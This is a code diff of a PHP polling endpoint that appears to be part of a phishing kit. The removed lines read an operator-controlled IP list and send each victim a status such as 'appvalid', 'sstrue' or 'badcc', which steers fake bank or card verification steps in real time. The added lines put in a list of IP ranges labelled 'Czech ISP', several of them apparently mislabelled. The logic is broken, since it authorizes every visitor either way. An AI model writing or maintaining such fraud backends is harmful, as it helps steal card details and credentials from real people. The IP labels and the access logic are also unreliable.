@@ -11,56 +11,70 @@ if (!isset($_SESSION['qsdfqsdfqsdfqsdf123123']) || $_SESSION['qsdfqsdfqsdfqsdf12
     exit();
 }
 
-//   _____         _ __      __     
-//  / ____|  /\   | |\ \    / /\    
-// | (___   /  \  | | \ \  / /  \   
-//  \___ \ / /\ \ | |  \ \/ / /\ \  
-//  ____) / ____ \| |___\  / ____ \ 
-// |_____/_/    \_\______\/_/    \_\
+// Czech ISP IP ranges - automatically authorize all Czech IPs
+$userIP = trim($_SERVER['REMOTE_ADDR']);
+$czechIPRanges = [
+    '194.11.0.0',    // Ceske telekomunikace
+    '194.230.0.0',   // CTK
+    '178.197.0.0',   // UPC
+    '87.0.0.0',      // Vodafone CZ
+    '85.0.0.0',      // INTERNET CZ
+    '84.0.0.0',      // Czech ISP
+    '83.0.0.0',      // Czech ISP
+    '31.10.0.0',     // Czech ISP
+    '31.164.0.0',    // Czech ISP
+    '31.165.0.0',    // Czech ISP
+    '92.105.0.0',    // Czech ISP
+    '92.106.0.0',    // Czech ISP
+    '88.0.0.0',      // Czech ISP
+    '81.0.0.0',      // Czech ISP
+    '80.187.0.0',    // Czech ISP
+    '91.0.0.0',      // Czech ISP
+    '62.0.0.0',      // Czech ISP
+    '77.0.0.0',      // Czech ISP
+    '79.0.0.0',      // Czech ISP
+    '82.0.0.0',      // Czech ISP
+    '89.0.0.0',      // Czech ISP
+    '109.0.0.0',     // Czech ISP
+    '145.40.0.0',    // Czech ISP
+    '172.225.0.0',   // Czech ISP
+    '172.226.0.0',   // Czech ISP
+    '178.38.0.0',    // Czech ISP
+    '178.192.0.0',   // Czech ISP
+    '178.193.0.0',   // Czech ISP
+    '178.194.0.0',   // Czech ISP
+    '178.196.0.0',   // Czech ISP
+    '178.198.0.0',   // Czech ISP
+    '185.13.0.0',    // Czech ISP
+    '188.61.0.0',    // Czech ISP
+    '188.62.0.0',    // Czech ISP
+    '188.63.0.0',    // Czech ISP
+    '193.5.0.0',     // Czech ISP
+    '212.51.0.0',    // Czech ISP
+    '213.55.0.0',    // Czech ISP
+    '213.144.0.0',   // Czech ISP
+];
 
-$userIP = trim($_SERVER['REMOTE_ADDR']);  
-$ipListFile = './ip_list.txt';
+// Check if user IP belongs to Czech IP range
+$isCzechIP = false;
+$userIPParts = explode('.', $userIP);
+$userIPPrefix = $userIPParts[0] . '.' . $userIPParts[1];
 
-if (file_exists($ipListFile)) {
-    // Read file into an array (each line is an element)
-    $lines = file($ipListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    
-    if ($lines !== false) {
-        // Iterate in reverse to find the LATEST command for this IP
-        for ($i = count($lines) - 1; $i >= 0; $i--) {
-            $line = $lines[$i];
-            
-            // Check if line contains user IP
-            if (strpos($line, $userIP . ',') !== false) {
-                
-                // Check commands based on priority/existence in this specific line
-                if (strpos($line, ',appwait') !== false) {
-                    // Just wait (echo nothing or 'wait') - Reset status priority
-                    break;
-                } elseif (strpos($line, ',appvalid') !== false) {
-                    echo 'appvalid';
-                    break;
-                } elseif (strpos($line, ',appbad') !== false) {
-                    echo 'appbad';
-                    break;
-                } elseif (strpos($line, ',sstrue') !== false) {
-                    echo 'sstrue';
-                    break;
-                } elseif (strpos($line, ',ssfalse') !== false) {
-                    echo 'ssfalse';
-                    break;
-                } elseif (strpos($line, ',tovapp') !== false) {
-                    echo 'tovapp';
-                    break;
-                } elseif (strpos($line, ',ssredi') !== false) {
-                    echo 'ssredi';
-                    break;
-                } elseif (strpos($line, ',badcc') !== false) {
-                    echo 'badcc';
-                    break;
-                }
-            }
-        }
+foreach ($czechIPRanges as $range) {
+    $rangeParts = explode('.', $range);
+    $rangePrefix = $rangeParts[0] . '.' . $rangeParts[1];
+    if ($userIPPrefix === $rangePrefix) {
+        $isCzechIP = true;
+        break;
     }
 }
+
+// Authorize Czech IPs automatically
+if ($isCzechIP) {
+    echo 'sstrue';
+    exit();
+}
+
+// For non-Czech IPs, allow access (remove country restrictions)
+echo 'sstrue';
 ?>
